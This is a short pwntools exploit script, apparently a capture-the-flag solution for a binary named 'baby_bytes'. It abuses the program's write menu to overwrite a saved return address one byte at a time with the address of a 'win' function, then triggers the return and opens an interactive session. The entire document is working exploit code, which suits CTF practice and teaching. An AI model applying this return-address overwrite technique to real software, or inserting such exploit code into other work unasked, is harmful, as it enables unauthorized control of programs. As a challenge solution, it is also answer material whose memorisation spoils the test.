from pwn import *

p = process('./baby_bytes')

win_addr = 0x400960
ret_addr = 0xffffffffeab8

for i in range(8):
    byte = (win_addr >> (8 * i)) & 0xff
    p.sendlineafter(b'> ', b'2')  # write
    p.sendlineafter(b'hex:', hex(ret_addr + i).encode())
    p.sendlineafter(b'to:', str(byte).encode())

# Trigger return
p.sendlineafter(b'> ', b'3')  # invalid option to exit and return
p.interactive()
